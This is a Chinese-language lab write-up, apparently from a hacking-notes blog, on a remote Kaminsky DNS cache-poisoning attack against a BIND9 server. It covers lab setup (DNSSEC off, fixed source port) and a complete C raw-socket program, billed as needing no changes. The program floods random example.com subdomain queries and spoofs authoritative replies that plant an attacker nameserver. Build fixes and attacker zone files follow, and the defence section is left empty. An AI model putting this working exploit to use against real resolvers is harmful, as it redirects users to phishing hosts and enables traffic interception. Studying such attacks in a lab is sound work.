## 钓鱼网站远程DNS攻击

- 远程DNS攻击
```
攻击者:192.168.59.1
普通用户:192.168.59.146
DNS服务器:192.168.59.153
```
- 攻击环境配置
- - DNS服务器环境配置
1. 安装bind9
2. 在`/etc/bind/named.conf.option`文件中添加`dump-file "/var/cache/bind/dump.db"`
3. 移除上个实验中的`example.com`Zone信息 在`/etc/bind/named.conf.default-zones`文件中
4. 启动DNS服务器 `service bind9 start`

- - 普通用户环境配置
1. 禁用DHCP "Edit Connections" -> "Wired connection1" -> "Edit" -> "IPv4 setting" -> "DHCP only" -> "192.168.59.153"
2. 重启一下网络 
3. 在`/etc/resolv.conf`文件中修改`nameserver 192.168.59.153`

- 远程DNS Cache中毒
- - Kaminsky攻击
远程DNS攻击原理如图所示:


如何让DNS服务器Cache中毒?
	1. TTL约束:域名不能在DNS Cache中存在
	2. Guess约束: transaction id必须一致
	3. Windows Time约束:伪造包要比真正的DNS服务器返回的包快
解决方案:
	1. 构造虚假域名
	2. 伪造大量的应答报文 transaction id 16bits
	3. 拼速度 我们肯定赢

- - 攻击环境配置
1. 配置攻击者环境 同普通用户环境配置
2. 设置DNS服务器源端口 在`/etc/bind/named.conf.option`文件中添加`query-source port 33333;`
3. 设置DNSSEC 在`/etc/bind/named.conf.option`文件中修改`dnssec-enable no;`
4. 刷新Cache`rndc flush` 重启DNS服务器`service bind9 restart`

- - 伪造DNS请求应答报文

```
// 直接编译运行 gcc -lpcap udp.c -o udp
// ./udp 普通用户IP地址 域名服务器IP地址
// 不需要修改任何代码 by ailx10 黑客笔记(http://hackbiji.top/)
// 参考文档：
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

struct ipheader
{
    unsigned char      iph_ihl: 4, iph_ver: 4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;

};

struct udpheader
{
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};
struct dnsheader
{
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};

struct dataEnd
{
    unsigned short int  type;
    unsigned short int  class;
};

struct ansEnd
{
    unsigned short int type;
    unsigned short int class;
    unsigned short int ttl_l;
    unsigned short int ttl_h;
    unsigned short int datalen;
};

struct nsEnd
{
    unsigned short int type;
    unsigned short int class;
    unsigned short int ttl_l;
    unsigned short int ttl_h;
    unsigned short int datalen;
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum = 0;
    for(; isize > 1; isize -= 2)
    {
        cksum += *usBuff++;
    }
    if(isize == 1)
    {
        cksum += *(uint16_t *)usBuff;
    }


    return (cksum);
}

uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum = 0;
    struct ipheader *tempI = (struct ipheader *)(buffer);
    struct udpheader *tempH = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *tempD = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    tempH->udph_chksum = 0;
    sum = checksum( (uint16_t *)   & (tempI->iph_sourceip) , 8 );
    sum += checksum((uint16_t *) tempH, len);

    sum += ntohs(IPPROTO_UDP + len);


    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);

    return (uint16_t)(~sum);

}

unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int response(char *request_url, char *src_addr, char *dest_addr)
{
    int sd;
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    dns->flags = htons(FLAG_R);
    dns->QDCOUNT = htons(1);
    dns->ANCOUNT = htons(1);
    dns->NSCOUNT = htons(1);
    dns->ARCOUNT = htons(1);

    strcpy(data, request_url);
    int length = strlen(data) + 1;

    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);
    char *ans = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length);

    strcpy(ans, request_url);
    int anslength = strlen(ans) + 1;

    struct ansEnd *ansend = (struct ansEnd *)(ans + anslength);
    ansend->type = htons(1);
    ansend->class = htons(1);
    ansend->ttl_l = htons(0x00);
    ansend->ttl_h = htons(0xD0);
    ansend->datalen = htons(4);

    char *ansaddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength);

    strcpy(ansaddr, "\1\1\1\1");
    int addrlen = strlen(ansaddr);

    char *ns = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen);
    strcpy(ns, "\7example\3com");
    int nslength = strlen(ns) + 1;

    struct nsEnd *nsend = (struct nsEnd *)(ns + nslength);
    nsend->type = htons(2);
    nsend->class = htons(1);
    nsend->ttl_l = htons(0x00);
    nsend->ttl_h = htons(0xD0);
    nsend->datalen = htons(23);

    char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct nsEnd) + nslength);

    strcpy(nsname, "\2ns\16dnslabattacker\3net");
    int nsnamelen = strlen(nsname) + 1;

    char *ar = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct nsEnd) + nslength + nsnamelen);
    strcpy(ar, "\2ns\16dnslabattacker\3net");
    int arlength = strlen(ar) + 1;
    struct ansEnd *arend = (struct ansEnd *)(ar + arlength);
    arend->type = htons(1);
    arend->class = htons(1);
    arend->ttl_l = htons(0x00);
    arend->ttl_h = htons(0xD0);
    arend->datalen = htons(4);
    char *araddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct nsEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd));

    strcpy(araddr, "\1\1\1\1");
    int araddrlen = strlen(araddr);


    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd < 0 )
        printf("socket error\n");

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(src_addr);
    din.sin_addr.s_addr = inet_addr("199.43.135.53");

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; 

    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd) + anslength + sizeof( struct ansEnd) + nslength + sizeof(struct nsEnd) + addrlen + nsnamelen + arlength + sizeof(struct ansEnd) + araddrlen); 

    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand()); 
    ip->iph_ttl = 110; 
    ip->iph_protocol = 17; // UDP

    ip->iph_sourceip = inet_addr("199.43.135.53");
    ip->iph_destip = inet_addr(src_addr);
    udp->udph_srcport = htons(53); 
    udp->udph_destport = htons(33333);


    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd) + anslength + sizeof( struct ansEnd) + nslength + sizeof(struct nsEnd) + addrlen + nsnamelen + arlength + sizeof(struct ansEnd) + araddrlen);

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
    {
        printf("error\n");
        exit(-1);
    }

    int count = 0;
    int trans_id = 3000;
    while(count < 100)
    {
        dns->query_id = trans_id + count;
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        count++;
    }
    close(sd);
    return 0;

}



int main(int argc, char *argv[])
{
    if(argc != 3)
    {
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }
    int sd;
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));


    dns->flags = htons(FLAG_Q);
    dns->QDCOUNT = htons(1);
    strcpy(data, "\5abcde\7example\3com");
    int length = strlen(data) + 1;

    struct dataEnd *end = (struct dataEnd *)(data + length);
    end->type = htons(1);
    end->class = htons(1);

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id = rand();

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd < 0 )
        printf("socket error\n");

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    sin.sin_addr.s_addr = inet_addr(argv[2]);
    din.sin_addr.s_addr = inet_addr(argv[1]);
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; 

    unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); 

    ip->iph_len = htons(packetLength);
    ip->iph_ident = htons(rand()); 
    ip->iph_ttl = 110;
    ip->iph_protocol = 17;
    ip->iph_sourceip = inet_addr(argv[1]);
    ip->iph_destip = inet_addr(argv[2]);

    udp->udph_srcport = htons(33333);
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd));
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
    {
        printf("error\n");
        exit(-1);
    }
    while(1)
    {
        int charnumber;
        charnumber = 1 + rand() % 5;
        *(data + charnumber) += 1;
        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n", errno, strerror(errno));
        sleep(0.01);
        response(data, argv[2], argv[1]);
    }
    close(sd);
    return 0;

}
```

BUG1解决方案:
```
root@gt:~/Desktop# gcc -lpcap dns.c -o dns
dns.c:26:10: fatal error: libnet.h: No such file or directory
 #include <libnet.h>
          ^~~~~~~~~~
compilation terminated.
root@gt:~/Desktop# apt-get install libnet1-dev
```

BUG2解决方案:
```
root@gt:~/Desktop# gcc -lpcap dns.c -o dns
/usr/bin/ld: cannot find -lpcap
collect2: error: ld returned 1 exit status
root@gt:~/Desktop# apt-get install libpcap-dev

```
不需要修改任何代码,编译运行:
注意:
第一个参数是普通用户的IP地址!!!
第二个参数是DNS服务器的IP地址!!!
` hacker@ubuntu:~/Desktop$ sudo ./udp 192.168.59.146 192.168.59.154 `

- 验证实验结果
- - 验证实验结果

由于`ns.dnslabattacker.net.`是假的!无法提供DNS应答!
所以,在本次实验中,我们需要在攻击者的电脑上搭建DNS服务器来模拟`ns.dnslabattacker.net.`!

配置如下:
1. DNS服务器环境配置:
在`/etc/bind/name.conf.default-zones`添加:
```
zone "ns.dnslabattacker.net" {
    type master;
    file "/etc/bind/db.attacker";
};
```
创建文件`/etc/bind/db.attacker` 内容如下:
```
;
; BIND data file for local loopback interface
;
$TTL   604800
@   IN  SOA localhost. root.localhost. (
                  2     ; Serial
             604800     ; Refresh
              86400     ; Retry
            2419200     ; Expire
             604800 )   ; Negative Cache TTL
;
@   IN  NS  ns.dnslabattacker.net.
@   IN  A   192.168.59.129
@   IN  AAAA    ::1
```

2. 攻击者环境配置:
在`/etc/bind/named.conf.default-zones`文件中添加:
```
zone "example.com" {
    type master;
    file "/etc/bind/example.com.db";
};
```
创建文件`/etc/bind/example.com.db ` 内容如下:
```
$TTL 3D
@   IN  SOA ns.example.com. admin.example.com. (
        2008111001
        8H
        2H
        4W
        1D)

@   IN  NS  ns.dnslabattacker.net.
@   IN  MX  10 mail.example.com.

www IN  A   1.1.1.1
mail    IN  A   1.1.1.2
*.example.com.  IN  A 1.1.1.100
```

3. 重启DNS服务器bind9 重启攻击者bind9
`sudo service bind9 restart`
4. 运行攻击程序 结果如图所示


- - 如何预防远程DNS攻击?
以后再说!

